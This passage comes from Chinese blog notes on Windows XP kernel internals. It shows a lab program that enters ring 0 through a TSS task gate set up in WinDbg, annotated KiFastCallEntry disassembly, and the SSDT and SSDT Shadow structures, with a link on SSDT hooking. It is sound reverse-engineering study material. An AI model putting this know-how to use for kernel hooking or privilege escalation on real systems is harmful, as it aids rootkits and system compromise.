class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;VirtualAlloc 失败，%d\n&quot;</span>, GetLastError());</span><br><span class="line">		getchar();</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请在windbg执行: eq 8003f048 %02x00e9%02x`%04x0068\n&quot;</span>, ((DWORD)TSS&gt;&gt;<span class="number">24</span>) &amp; <span class="number">0x000000FF</span>,((DWORD)TSS&gt;&gt;<span class="number">16</span>) &amp; <span class="number">0x000000FF</span>, (WORD)TSS);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请在windbg中执行!process 0 0，复制当前进程DirBase的值，并输入.\nCR3: &quot;</span>); <span class="comment">// 在windbg中执行 !process 0 0 获取，DirBase: 13600420  这个数要启动程序后现查</span></span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%x&quot;</span>, &amp;dwCr3); <span class="comment">// 注意是%x</span></span><br><span class="line">	</span><br><span class="line">	TSS[<span class="number">0</span>] = <span class="number">0x00000000</span>; <span class="comment">// Previous Task Link CPU填充，表示上一个任务的选择子</span></span><br><span class="line">	TSS[<span class="number">1</span>] = <span class="number">0x00000000</span>; <span class="comment">// ESP0</span></span><br><span class="line">	TSS[<span class="number">2</span>] = <span class="number">0x00000000</span>; <span class="comment">// SS0</span></span><br><span class="line">	TSS[<span class="number">3</span>] = <span class="number">0x00000000</span>; <span class="comment">// ESP1</span></span><br><span class="line">	TSS[<span class="number">4</span>] = <span class="number">0x00000000</span>; <span class="comment">// SS1</span></span><br><span class="line">	TSS[<span class="number">5</span>] = <span class="number">0x00000000</span>; <span class="comment">// ESP2</span></span><br><span class="line">	TSS[<span class="number">6</span>] = <span class="number">0x00000000</span>; <span class="comment">// SS2</span></span><br><span class="line">	TSS[<span class="number">7</span>] = dwCr3; <span class="comment">// CR3 学到页就知道是啥了</span></span><br><span class="line">	TSS[<span class="number">8</span>] = (DWORD)R0Func; <span class="comment">// EIP</span></span><br><span class="line">	TSS[<span class="number">9</span>] = <span class="number">0x00000000</span>; <span class="comment">// EFLAGS</span></span><br><span class="line">	TSS[<span class="number">10</span>] = <span class="number">0x00000000</span>; <span class="comment">// EAX</span></span><br><span class="line">	TSS[<span class="number">11</span>] = <span class="number">0x00000000</span>; <span class="comment">// ECX</span></span><br><span class="line">	TSS[<span class="number">12</span>] = <span class="number">0x00000000</span>; <span class="comment">// EDX</span></span><br><span class="line">	TSS[<span class="number">13</span>] = <span class="number">0x00000000</span>; <span class="comment">// EBX</span></span><br><span class="line">	TSS[<span class="number">14</span>] = (DWORD)esp+<span class="number">0x900</span>; <span class="comment">// ESP，解释：esp是一个0x1000的字节数组，作为裸函数的栈，这里传进去的应该是高地址，压栈才不会越界</span></span><br><span class="line">	TSS[<span class="number">15</span>] = <span class="number">0x00000000</span>; <span class="comment">// EBP</span></span><br><span class="line">	TSS[<span class="number">16</span>] = <span class="number">0x00000000</span>; <span class="comment">// ESI</span></span><br><span class="line">	TSS[<span class="number">17</span>] = <span class="number">0x00000000</span>; <span class="comment">// EDI</span></span><br><span class="line">	TSS[<span class="number">18</span>] = <span class="number">0x00000023</span>; <span class="comment">// ES</span></span><br><span class="line">	TSS[<span class="number">19</span>] = <span class="number">0x00000008</span>; <span class="comment">// CS 0x0000001B</span></span><br><span class="line">	TSS[<span class="number">20</span>] = <span class="number">0x00000010</span>; <span class="comment">// SS 0x00000023</span></span><br><span class="line">	TSS[<span class="number">21</span>] = <span class="number">0x00000023</span>; <span class="comment">// DS</span></span><br><span class="line">	TSS[<span class="number">22</span>] = <span class="number">0x00000030</span>; <span class="comment">// FS 0x0000003B</span></span><br><span class="line">	TSS[<span class="number">23</span>] = <span class="number">0x00000000</span>; <span class="comment">// GS</span></span><br><span class="line">	TSS[<span class="number">24</span>] = <span class="number">0x00000000</span>; <span class="comment">// LDT Segment Selector</span></span><br><span class="line">	TSS[<span class="number">25</span>] = <span class="number">0x20ac0000</span>; <span class="comment">// I/O Map Base Address</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span> buff[<span class="number">6</span>] = &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x48</span>,<span class="number">0</span>&#125;;	</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//jmp fword ptr[buff]</span></span><br><span class="line">		<span class="keyword">int</span> <span class="number">32</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;ok: %d\nESP: %x\nCS: %x\n&quot;</span>, dwOk, dwESP, dwCS);</span><br><span class="line">	system(<span class="string">&quot;Pause&quot;</span>);</span><br><span class="line">	getchar();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="4">
<li><p>在VC6中执行代码。</p>
</li>
<li><p>根据TSS任务段的地址在GDT表中构造TSS任务段描述符，然后获取CR3的值。（<code>!process 0 0</code>）</p>
<p><img data-src="https://s2.loli.net/2021/12/24/GfMEVXwo3YjxIka.png" alt="91.png"></p>
<p><img data-src="https://s2.loli.net/2021/12/24/f6XcAY3LS58Jqly.png" alt="92.png"></p>
</li>
<li><p>回到XP的VC6中输入CR3的值06e40300后F5继续执行。</p>
<p><img data-src="https://s2.loli.net/2021/12/24/oyWE4AZ8aUYwxOB.png" alt="93.png"></p>
</li>
</ol>
</li>
</ol>
<p><a href="https://directoree.github.io/post/WinXP-ProtectionMode-Segment/">Windows XP 段保护（一）</a></p>
<p><a href="https://directoree.github.io/post/WinXP-ProtectionMode-Segment2/">Windows XP 段保护（二）</a></p>
<p><a href="https://directoree.github.io/post/WinXP-ProtectionMode-Segment3/">Windows XP 段保护（三）</a></p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>保护模式</category>
        <category>Windows内核</category>
      </categories>
      <tags>
        <tag>WinXP内核</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows XP 系统调用（二）</title>
    <url>/post/WinXP-SystemCall2/</url>
    <content><![CDATA[<p>ʕ •ᴥ•ʔ  ɔ: </p>
<span id="more"></span>

<h2 id="1-系统服务调用"><a href="#1-系统服务调用" class="headerlink" title="1 系统服务调用"></a>1 系统服务调用</h2><p>上一篇分析了2种方式从3环进0环，进入0环后分别调用2个0环的函数：KiSystemService（int 0x2e）、KiFastCallEntry（sysenter），这两个函数经过一波初始化任务之后都转到相同的地址去就执行代码。以下4个问题中的1已经在上一篇解决了（保留到_Trap_Frame结构体中），接下来将会继续分析问题2和3，问题4要等到学习APC之后才能解决。</p>
<ol>
<li>进0环后，原来的寄存器存在哪里？</li>
<li>如何根据系统调用号（eax中存储）找到要执行的内核函数？</li>
<li>调用时参数是存储到3环的堆栈，如何传递给内核函数？</li>
<li>2种调用方式是如何返回到3环的？</li>
</ol>
<h3 id="1-1-SystemServiceTable（SST）"><a href="#1-1-SystemServiceTable（SST）" class="headerlink" title="1.1 SystemServiceTable（SST）"></a>1.1 SystemServiceTable（SST）</h3><div class="note warning"><p><mark class="label danger">注意：</mark><strong>SystemServiceTable 系统服务表不是SSDT。</strong></p>
<p>SystemServiceTable：<strong>SST</strong>，系统服务表。<br>System Services Descriptor Table：<strong>SSDT</strong>，系统服务描述符表，导出结构为KeServiceDescriptorTable（在内核ntoskrnl.exe导出表中可看到该<strong>全局变量</strong>）。<br>SystemServiceParameterTable：<strong>SSPT</strong>，系统服务参数表。</p>
<p>System Services Descriptor Table Shadow：<strong>SSDT Shadow</strong>，系统服务描述符表Shadow，导出结构为KeServiceDescriptorTableShadow，该结构没有导出。</p>
</div>



<p><img data-src="https://s2.loli.net/2022/03/02/42VKOw67PTjZhXD.png" alt="19.png"></p>
<div class="note primary"><p>通过上图，我们可以得知以下信息：</p>
<ul>
<li>通过<code>_KTHREAD</code>偏移<code>0xE0</code>可以找到系统服务表SSDT。</li>
<li>系统服务表又指向了函数地址表和函数参数表（SSPT）</li>
<li>有两张系统服务表，第一张是用来找内核函数的，第二张是找<code>Win32k.sys</code>驱动函数的。</li>
<li><strong>两张系统服务表是线性地址连续的，每张16字节</strong>。</li>
<li>SST表成员：<ul>
<li>ServiceTable，是一个指针，指向函数地址表（每个成员4Byte）。</li>
<li>Count没有用。</li>
<li>ServiceLimit，当前系统服务表函数的个数。</li>
<li>ArgmentTable，指向函数参数表，参数表每个成员大小为1字节，值为参数的大小，函数参数个数（<strong>存储值 &#x2F; 4 &#x3D; 参数个数</strong>），每个成员和函数地址表中的函数一一对应。</li>
</ul>
</li>
</ul>
</div>

<p>3环API进0环之前，无论是中断门还是快速调用，都会在 eax 里存一个值，我们称之为<strong>系统调用号或者服务号</strong>。EAX系统服务号：</p>
<ul>
<li>1～12位：函数地址表&#x2F;函数参数表索引（下标）。</li>
<li><mark class="label danger">第13位（下标12）</mark>：
<ul>
<li><strong>0</strong>，表示找第一张系统服务表（绿色的表）；</li>
<li><strong>1</strong>，那么找第二张表（黄色的表）。</li>
</ul>
</li>
</ul>
<p><img data-src="https://s2.loli.net/2022/03/02/uQpa9owirSz8sMJ.png" alt="20.png"></p>
<p>SST结构如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">KSYSTEM_SERVICE_TABLE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  PULONG ServiceTableBase;       <span class="comment">// 函数地址表基址</span></span><br><span class="line">  PULONG ServiceCounterTableBase;<span class="comment">// 函数被调用的次数</span></span><br><span class="line">  ULONG NumberOfService;         <span class="comment">// 函数个数</span></span><br><span class="line">  PULONG ParamTableBase;         <span class="comment">// 函数参数表基址</span></span><br><span class="line">&#125; KSYSTEM_SERVICE_TABLE, *PKSYSTEM_SERVICE_TABLE,SST;</span><br></pre></td></tr></table></figure>

<h3 id="1-2-继续分析函数"><a href="#1-2-继续分析函数" class="headerlink" title="1.2 继续分析函数"></a>1.2 继续分析函数</h3><p>前篇博客，逆向分析了 KiSystemService 和 KiFastCallEntry 填充_KTRAP_FRAME 结构体的代码，二者大同小异，主要的区别是 sysenter 只改了eip,cs,ss，虽然esp也改了，但是windows不使用，而是从TSS里取esp0；另外sysenter并没有像中断门那样压栈，所以3环的 ss, esp, eflags, cs,eip都要在函数里依次保存到 _KTRAP_FRAME 。</p>
<p>他们两个函数开头的初始化工作不一样，有两个入口，初始化的工作有区别，但是往后就共用一个函数体。以下继续分析：</p>
<ul>
<li>如何根据系统服务号（eax中存储）找到要执行的内核函数？</li>
<li>调用时参数是存储到3环的堆栈，如何传递给内核函数？</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0046</span>A5AF</span><br><span class="line">.text:<span class="number">0046</span>A5AF loc_46A5AF:                             ; CODE XREF: _KiBBTUnexpectedRange+<span class="number">18</span>↑j</span><br><span class="line">.text:<span class="number">0046</span>A5AF                                         ; _KiSystemService+<span class="number">72</span>↑j</span><br><span class="line">.text:<span class="number">0046</span>A5AF                 mov     edi, eax		<span class="comment">//edi = eax = 系统调用号</span></span><br><span class="line">.text:<span class="number">0046</span>A5B1                 shr     edi, <span class="number">8</span>		<span class="comment">//系统服务号右移8位</span></span><br><span class="line">.text:<span class="number">0046</span>A5B4                 <span class="keyword">and</span>     edi, <span class="number">30</span>h		<span class="comment">//edi = 取系统服务号第13、14位来与运算</span></span><br><span class="line">  							<span class="comment">//000X xxxx &amp; 0011 0000 = 000X 0000 = 0xX0 = 0x10/0x00</span></span><br><span class="line">.text:<span class="number">0046</span>A5B7                 mov     ecx, edi		<span class="comment">//ecx = edi = 0x10/0x00</span></span><br><span class="line">.text:<span class="number">0046</span>A5B9                 add     edi, [esi+<span class="number">0E0</span>h]	<span class="comment">//esi = _KTHREAD，esi+0E0h指向SSDT，edi = SST</span></span><br><span class="line">  							<span class="comment">//系统服务表有ServiceTable,Count,ServiceLimit和ArgmentTable四个成员，</span></span><br><span class="line">  							<span class="comment">//4项共0x10字节，所以通过这里的代码也可以推断，内核和win32k.sys的系统服务表是</span></span><br><span class="line">  							<span class="comment">//连续的。第一张是ntoskrnl.exe导出，第二张是win32k.sys导出的</span></span><br><span class="line">.text:<span class="number">0046</span>A5BF                 mov     ebx, eax		<span class="comment">//ebx = eax = 系统调用号</span></span><br><span class="line">.text:<span class="number">0046</span>A5C1                 <span class="keyword">and</span>     eax, <span class="number">0F</span>FFh	<span class="comment">//取系统调用号低12位做偏移</span></span><br><span class="line">.text:<span class="number">0046</span>A5C6                 cmp     eax, [edi+<span class="number">8</span>]	<span class="comment">//系统调用号 - SST.ServiceLimit，判断函数是否在表的范围内</span></span><br><span class="line">.text:<span class="number">0046</span>A5C9                 jnb     _KiBBTUnexpectedRange<span class="comment">//系统调用号 &gt;= SST.ServiceLimit，不在表里，跳转异常处理</span></span><br><span class="line">.text:<span class="number">0046</span>A5CF                 cmp     ecx, <span class="number">10</span>h		<span class="comment">//判断系统服务号的函数是ntoskrnl.exe/win32k.sys导出</span></span><br><span class="line">.text:<span class="number">0046</span>A5D2                 jnz     <span class="keyword">short</span> loc_46A5EF	<span class="comment">//判断系统服务号的函数是ntoskrnl.exe</span></span><br><span class="line">.text:<span class="number">0046</span>A5D4                 mov     ecx, large fs:<span class="number">18</span>h<span class="comment">//ecx指向_NT_TIB</span></span><br><span class="line">.text:<span class="number">0046</span>A5DB                 <span class="keyword">xor</span>     ebx, ebx		<span class="comment">//ebx = 0</span></span><br><span class="line">.text:<span class="number">0046</span>A5DD</span><br><span class="line">.text:<span class="number">0046</span>A5DD loc_46A5DD:                             ; DATA XREF: _KiTrap0E+<span class="number">117</span>↓o</span><br><span class="line">.text:<span class="number">0046</span>A5DD                 <span class="keyword">or</span>      ebx, [ecx+<span class="number">0F</span>70h]</span><br><span class="line">.text:<span class="number">0046</span>A5E3                 jz      <span class="keyword">short</span> loc_46A5EF</span><br><span class="line">.text:<span class="number">0046</span>A5E5                 push    edx</span><br><span class="line">.text:<span class="number">0046</span>A5E6                 push    eax</span><br><span class="line">.text:<span class="number">0046</span>A5E7                 call    ds:_KeGdiFlushUserBatch</span><br><span class="line">.text:<span class="number">0046</span>A5ED                 pop     eax</span><br><span class="line">.text:<span class="number">0046</span>A5EE                 pop     edx</span><br><span class="line">.text:<span class="number">0046</span>A5EF</span><br><span class="line">.text:<span class="number">0046</span>A5EF loc_46A5EF:                             ; CODE XREF: _KiFastCallEntry+B2↑j</span><br><span class="line">.text:<span class="number">0046</span>A5EF                                         ; _KiFastCallEntry+C3↑j</span><br><span class="line">.text:<span class="number">0046</span>A5EF                 inc     large dword ptr fs:<span class="number">638</span>h	<span class="comment">//0FFDFF638h = fs[0]+_KPRCB+518 = KeSystemCalls</span></span><br><span class="line">  								<span class="comment">//_KPCR.KPRCB.KeSystemCalls += 1, 系统调用计数加1</span></span><br><span class="line">.text:<span class="number">0046</span>A5F6                 mov     esi, edx		<span class="comment">//esi指向3环API第一个参数</span></span><br><span class="line">.text:<span class="number">0046</span>A5F8                 mov     ebx, [edi+<span class="number">0</span>Ch]	<span class="comment">//ebx = SST.ArgmentTable</span></span><br><span class="line">.text:<span class="number">0046</span>A5FB                 <span class="keyword">xor</span>     ecx, ecx		<span class="comment">//ecx = 0</span></span><br><span class="line">.text:<span class="number">0046</span>A5FD                 mov     cl, [eax+ebx]	<span class="comment">//ecx = SST.ArgmentTable + 系统调用号低12位*1，即ecx = 函数参数大小</span></span><br><span class="line">.text:<span class="number">0046</span>A600                 mov     edi, [edi]	<span class="comment">//edi = SST.ServiceTable = KeServiceDescriptorTable</span></span><br><span class="line">.text:<span class="number">0046</span>A602                 mov     ebx, [edi+eax*<span class="number">4</span>]	<span class="comment">//ebx = SST.ServiceTable + 系统调用号低12位*4 = 函数地址</span></span><br><span class="line">.text:<span class="number">0046</span>A605                 sub     esp, ecx		<span class="comment">//0环抬高栈顶，马上将3环参数复制到0环</span></span><br><span class="line">.text:<span class="number">0046</span>A607                 shr     ecx, <span class="number">2</span>		<span class="comment">//ecx = 参数个数 = 参数大小/4</span></span><br><span class="line">.text:<span class="number">0046</span>A60A                 mov     edi, esp		<span class="comment">//edi指向0环栈顶</span></span><br><span class="line">.text:<span class="number">0046</span>A60C                 cmp     esi, ds:_MmUserProbeAddress<span class="comment">//越界检查，如果 esi（3环参数指针）大于等于</span></span><br><span class="line">.text:<span class="number">0046</span>A612                 jnb     loc_46A7C0	<span class="comment">//用户空间0x7fff0000，则返回 c0000005 异常</span></span><br><span class="line">.text:<span class="number">0046</span>A618</span><br><span class="line">.text:<span class="number">0046</span>A618 loc_46A618:                             ; CODE XREF: _KiFastCallEntry+<span class="number">2</span>A4↓j</span><br><span class="line">.text:<span class="number">0046</span>A618                                         ; DATA XREF: _KiTrap0E+<span class="number">10</span>D↓o</span><br><span class="line">.text:<span class="number">0046</span>A618                 rep movsd		<span class="comment">//复制参数：复制 esi 到 edi，每次复制4字节，次数由 ecx 决定</span></span><br><span class="line">  							<span class="comment">//方向由DF决定，DF=0，故每次复制后，edi 和 esi 都加4</span></span><br><span class="line">.text:<span class="number">0046</span>A61A                 call    ebx		<span class="comment">//调用内核函数，ebx = 函数地址，返回值存储在eax中</span></span><br><span class="line">.text:<span class="number">0046</span>A61C</span><br><span class="line">.text:<span class="number">0046</span>A61C loc_46A61C:                             ; CODE XREF: _KiFastCallEntry+<span class="number">2</span>AF↓j</span><br><span class="line">.text:<span class="number">0046</span>A61C                                         ; DATA XREF: _KiTrap0E+<span class="number">12</span>D↓o ...</span><br><span class="line">.text:<span class="number">0046</span>A61C                 mov     esp, ebp</span><br><span class="line">.text:<span class="number">0046</span>A61E</span><br><span class="line">.text:<span class="number">0046</span>A61E loc_46A61E:                             ; CODE XREF: _KiBBTUnexpectedRange+<span class="number">38</span>↑j</span><br><span class="line">.text:<span class="number">0046</span>A61E                                         ; _KiBBTUnexpectedRange+<span class="number">43</span>↑j</span><br><span class="line">.text:<span class="number">0046</span>A61E                 mov     ecx, large fs:<span class="number">124</span>h</span><br><span class="line">.text:<span class="number">0046</span>A625                 mov     edx, [ebp+<span class="number">3</span>Ch]</span><br><span class="line">.text:<span class="number">0046</span>A628                 mov     [ecx+<span class="number">134</span>h], edx</span><br><span class="line">.text:<span class="number">0046</span>A628 _KiFastCallEntry endp</span><br><span class="line">.text:<span class="number">0046</span>A628</span><br><span class="line">.text:<span class="number">0046</span>A62E</span><br><span class="line">.text:<span class="number">0046</span>A62E ; =============== S U B R O U T I N E =======================================</span><br></pre></td></tr></table></figure>



<h2 id="2-SSDT"><a href="#2-SSDT" class="headerlink" title="2 SSDT"></a>2 SSDT</h2><p>SSDT（System Services Descriptor Table）系统服务描述符表，内核模块ntoskrnl.exe导出的一个全局变量KeServiceDescriptorTable，用来指向SSDT。</p>
<p>SSDT结构：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">KSERVICE_TABLE_DESCRIPTOR</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  KSYSTEM_SERVICE_TABLE ntoskrnl;    <span class="comment">// 内核函数</span></span><br><span class="line">  KSYSTEM_SERVICE_TABLE win32k;      <span class="comment">// win32k.sys 函数</span></span><br><span class="line">  KSYSTEM_SERVICE_TABLE unUsed1;     <span class="comment">// 未使用</span></span><br><span class="line">  KSYSTEM_SERVICE_TABLE unUsed2;     <span class="comment">// 未使用</span></span><br><span class="line">&#125; KSERVICE_TABLE_DESCRIPTOR, *PKSERVICE_TABLE_DESCRIPTOR, SSDT;</span><br></pre></td></tr></table></figure>

<h3 id="2-1-SST和SSDT"><a href="#2-1-SST和SSDT" class="headerlink" title="2.1 SST和SSDT"></a>2.1 SST和SSDT</h3><p>SST和SSDT的关系如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">SSDT</span><br><span class="line">&#123;</span><br><span class="line">  SST;</span><br><span class="line">  SST;</span><br><span class="line">  SST;</span><br><span class="line">  SST;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>SST结构如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">KSYSTEM_SERVICE_TABLE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  PULONG ServiceTableBase;       <span class="comment">// 函数地址表基址</span></span><br><span class="line">  PULONG ServiceCounterTableBase;<span class="comment">// 函数被调用的次数</span></span><br><span class="line">  ULONG NumberOfService;         <span class="comment">// 函数个数</span></span><br><span class="line">  PULONG ParamTableBase;         <span class="comment">// 函数参数表基址</span></span><br><span class="line">&#125; KSYSTEM_SERVICE_TABLE, *PKSYSTEM_SERVICE_TABLE,SST;</span><br></pre></td></tr></table></figure>

<p>通过前面1.2的分析，要找到SST表可以通过<code>_KTHREAD + 0xE0</code>指向的地址找到，Windows系统在内核模块中导出了一个全局变量KeServiceDescriptorTable（SSDT），也可以得到SST表。</p>
<p><img data-src="https://s2.loli.net/2022/02/19/TdAGBr9ma7QPqtW.png" alt="15.png"></p>
<p>通过<code>_KTHREAD + 0xE0</code>查找SST：</p>
<ol>
<li><p><code>fs[0] = _KPCR = 0xffdff000</code>。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; u _KPCR ffdff000</span><br><span class="line">Couldn&#x27;t resolve error at &#x27;_KPCR ffdff000&#x27;</span><br><span class="line">kd&gt; dt _KPCR ffdff000</span><br><span class="line">nt!_KPCR</span><br><span class="line">   +<span class="number">0x000</span> NtTib            : _NT_TIB</span><br><span class="line">   +<span class="number">0x01c</span> SelfPcr          : <span class="number">0xffdff000</span> _KPCR</span><br><span class="line">   +<span class="number">0x020</span> Prcb             : <span class="number">0xffdff120</span> _KPRCB</span><br><span class="line">   ...</span><br></pre></td></tr></table></figure>
</li>
<li><p>可以看到<code>_KPRCB = 0xffdff120</code>。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">+<span class="number">0x000</span> MinorVersion     : <span class="number">1</span></span><br><span class="line">   +<span class="number">0x002</span> MajorVersion     : <span class="number">1</span></span><br><span class="line">   +<span class="number">0x004</span> CurrentThread    : <span class="number">0x8055ce60</span> _KTHREAD</span><br><span class="line">   +<span class="number">0x008</span> NextThread       : (null) </span><br><span class="line">   +<span class="number">0x00c</span> IdleThread       : <span class="number">0x8055ce60</span> _KTHREAD</span><br><span class="line">   ...</span><br></pre></td></tr></table></figure>
</li>
<li><p>可以看到<code>_KTHREAD = 0x8055ce60</code>。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; dt _KTHREAD <span class="number">0x8055ce60</span></span><br><span class="line">ntdll!_KTHREAD</span><br><span class="line">   +<span class="number">0x000</span> Header           : _DISPATCHER_HEADER</span><br><span class="line">   +<span class="number">0x010</span> MutantListHead   : _LIST_ENTRY [ <span class="number">0x8055ce70</span> - <span class="number">0x8055ce70</span> ]</span><br><span class="line">   ...</span><br><span class="line">   +<span class="number">0x0e0</span> ServiceTable     : <span class="number">0x8055d700</span> Void</span><br><span class="line">   +<span class="number">0x0e4</span> Queue            : (null) </span><br><span class="line">   +<span class="number">0x0e8</span> ApcQueueLock     : <span class="number">0</span></span><br><span class="line">   ...</span><br></pre></td></tr></table></figure>
</li>
<li><p>以看到<code>0x8055d700</code>指向SSDT。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; dd <span class="number">0x8055d700</span></span><br><span class="line"><span class="number">8055</span>d700  <span class="number">80505450</span> <span class="number">00000000</span> <span class="number">0000011</span>c <span class="number">805058</span>c4</span><br><span class="line"><span class="number">8055</span>d710  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">8055</span>d720  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">8055</span>d730  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">8055</span>d740  <span class="number">00000002</span> <span class="number">00002710</span> bf80c0b6 <span class="number">00000000</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>查看内核模块导出的结构<code>KeServiceDescriptorTable</code>。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; dd KeServiceDescriptorTable</span><br><span class="line"><span class="number">8055</span>d700  <span class="number">80505450</span> <span class="number">00000000</span> <span class="number">0000011</span>c <span class="number">805058</span>c4</span><br><span class="line"><span class="number">8055</span>d710  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">8055</span>d720  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">8055</span>d730  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">8055</span>d740  <span class="number">00000002</span> <span class="number">00002710</span> bf80c0b6 <span class="number">00000000</span></span><br></pre></td></tr></table></figure></li>
</ol>
<div class="note danger"><p>可以得到结论：</p>
<ol>
<li>通过<code>_KTHREAD + 0xE0</code>查找得到表是SSDT，通过ntkrnlpa.exe（2-9-9-12）导出结构<code>KeServiceDescriptorTable</code>得到的也是SSDT。</li>
<li><strong>SSDT中过包涵4个SST</strong>，但是仅可以看到第一个（由ntkrnlpa.exe导出的全局变量），想要看到<code>win32k.sys</code>导出的函数还需要分析系统未导出的结构SSDT Shadow。</li>
</ol>
</div>

<p>关于SSDT更多细节可参读：</p>
<ul>
<li><a href="https://www.cnblogs.com/wf751620780/p/10460863.html">SSDT(系统服务描述符表 system services descriptor table)</a></li>
<li><a href="https://www.cnblogs.com/BoyXiao/archive/2011/09/03/2164574.html">进程隐藏与进程保护（SSDT Hook 实现）（一）</a></li>
</ul>
<h3 id="2-2-SSDT和SSDT-Shadow"><a href="#2-2-SSDT和SSDT-Shadow" class="headerlink" title="2.2 SSDT和SSDT Shadow"></a>2.2 SSDT和SSDT Shadow</h3><ul>
<li><strong>SSDT</strong>：KeServiceDescriptorTable，是由ntkrnlpa.exe导出的全局变量，可以在代码中（仅0环）使用。</li>
<li><strong>SSDT Shadow：</strong>KeServiceDescriptorTableShadow，不是导出结构，不可以在0环代码中使用。</li>
</ul>
<p>查看SSDT和SSDT Shadow：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; dd KeServiceDescriptorTable</span><br><span class="line"><span class="number">8055</span>d700  <span class="number">80505450</span> <span class="number">00000000</span> <span class="number">0000011</span>c <span class="number">805058</span>c4</span><br><span class="line"><span class="number">8055</span>d710  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">8055</span>d720  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">8055</span>d730  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">8055</span>d740  <span class="number">00000002</span> <span class="number">00002710</span> bf80c0b6 <span class="number">00000000</span></span><br><span class="line">  </span><br><span class="line">kd&gt; dd KeServiceDescriptorTableShadow</span><br><span class="line"><span class="number">8055</span>d6c0  <span class="number">80505450</span> <span class="number">00000000</span> <span class="number">0000011</span>c <span class="number">805058</span>c4</span><br><span class="line"><span class="number">8055</span>d6d0  bf999b80 <span class="number">00000000</span> <span class="number">0000029b</span> bf99a890</span><br><span class="line"><span class="number">8055</span>d6e0  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">8055</span>d6f0  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">8055</span>d700  <span class="number">80505450</span> <span class="number">00000000</span> <span class="number">0000011</span>c <span class="number">805058</span>c4</span><br></pre></td></tr></table></figure>

<div class="note default"><ol>
<li>SSDT、SSDT Shadow都包含4个SST，但从SSDT中仅可看到由ntkrnlpa.exe导出函数的地址表。</li>
<li>SSDT Shadow可以看到2个地址表，由ntkrnlpa.exe和win32k.sys导出。</li>
</ol>
</div>

<p>在驱动程序中使用SSDT：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//extern &quot;C&quot; __declspec(dllimport)  SSDT  KeServiceDescriptorTable;</span></span><br><span class="line"><span class="keyword">extern</span> SSDT  KeServiceDescriptorTable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">KSYSTEM_SERVICE_TABLE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  PULONG ServiceTableBase;       <span class="comment">// 函数地址表基址</span></span><br><span class="line">  PULONG ServiceCounterTableBase;<span class="comment">// 函数被调用的次数</span></span><br><span class="line">  ULONG NumberOfService;         <span class="comment">// 函数个数</span></span><br><span class="line">  PULONG ParamTableBase;         <span class="comment">// 函数参数表基址</span></span><br><span class="line">&#125; KSYSTEM_SERVICE_TABLE, *PKSYSTEM_SERVICE_TABLE,SST;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">KSERVICE_TABLE_DESCRIPTOR</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span 